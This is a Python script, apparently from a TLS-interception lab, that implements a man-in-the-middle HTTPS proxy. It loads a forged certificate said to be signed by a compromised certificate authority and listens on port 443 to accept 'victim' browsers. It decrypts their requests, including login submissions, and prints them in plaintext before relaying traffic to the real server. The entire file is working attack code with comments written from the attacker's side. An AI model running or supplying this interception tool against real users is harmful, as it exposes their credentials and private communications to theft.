import socket
import ssl
import threading

# The port the proxy will listen on (443 is standard for HTTPS)
LISTEN_PORT = 443 

def process_request(ssock_for_browser, hostname):
    """
    This function handles the core MITM logic:
    1. Receives data from the Browser (Victim)
    2. Inspects/Logs the data (Interception)
    3. Forwards the data to the Real Server
    4. Returns the Server's response back to the Browser
    """
    try:
        # --- PHASE 1: CONNECT TO THE REAL SERVER ---
        # The proxy now acts as a CLIENT to the real web server.
        context_cli = ssl.create_default_context()
        
        # Create a standard TCP connection to the real server's IP
        sock_for_server = socket.create_connection((hostname, 443))
        
        # Wrap the socket with TLS to establish a secure link with the real server
        ssock_for_server = context_cli.wrap_socket(sock_for_server, server_hostname=hostname)

        # --- PHASE 2: INTERCEPT DATA FROM BROWSER ---
        # Receive the HTTP Request (e.g., GET / or POST /login)
        request = ssock_for_browser.recv(4096)
        
        if request:
            # INTERCEPTION POINT:
            # This is where the attacker sees the plaintext because the proxy 
            # has already decrypted the TLS traffic from the browser.
            print(f"\n[+] DATA INTERCEPTED FOR HOST: {hostname}")
            print("-" * 50)
            # We use 'ignore' to prevent crashes on non-text binary data (like images)
            print(request.decode('utf-8', errors='ignore'))
            print("-" * 50)

            # --- PHASE 3: FORWARD REQUEST TO REAL SERVER ---
            ssock_for_server.sendall(request)

            # --- PHASE 4: RELAY RESPONSE BACK TO BROWSER ---
            # We use a loop to ensure we capture the entire response (HTML, CSS, JS)
            while True:
                response = ssock_for_server.recv(4096)
                if not response:
                    break
                # Forward the real server's response back to the victim's browser
                ssock_for_browser.sendall(response)

    except Exception as e:
        print(f"[-] Error during proxying: {e}")
    finally:
        # Clean up connections
        ssock_for_browser.close()
        try:
            ssock_for_server.close()
        except:
            pass

def main():
    # SET THE TARGET: This must match the domain in your forged certificate
    target_hostname = 'www.example.com' 

    # --- SERVER SETUP (Talking to the Victim) ---
    # The proxy acts as a SERVER to the victim's browser.
    context_srv = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    
    # Load the FORGED certificate signed by your compromised CA
    # 'target.crt' should have 'www.example.com' in its SAN/CN fields
    try:
        context_srv.load_cert_chain(certfile='./server-certs/target.crt', keyfile='./server-certs/target.key')
    except Exception as e:
        print(f"[-] Failed to load certificates: {e}")
        return

    # Create the listening TCP socket
    sock_listen = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    sock_listen.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock_listen.bind(('0.0.0.0', LISTEN_PORT))
    sock_listen.listen(10)
    
    print(f"[*] mHTTPSproxy active...")
    print(f"[*] Relaying traffic for {target_hostname} on port {LISTEN_PORT}")

    while True:
        # Wait for a connection from the victim
        sock_for_browser, fromaddr = sock_listen.accept()
        
        try:
            # Perform the TLS Handshake with the browser using the forged certificate
            ssock_for_browser = context_srv.wrap_socket(sock_for_browser, server_side=True)
            
            # Start a new thread to handle this specific request
            # This allows the proxy to handle multiple images/scripts at once
            thread = threading.Thread(
                target=process_request, 
                args=(ssock_for_browser, target_hostname)
            )
            thread.start()
            
        except Exception as e:
            print(f"[-] TLS Handshake with browser failed: {e}")

if __name__ == '__main__':
    main()
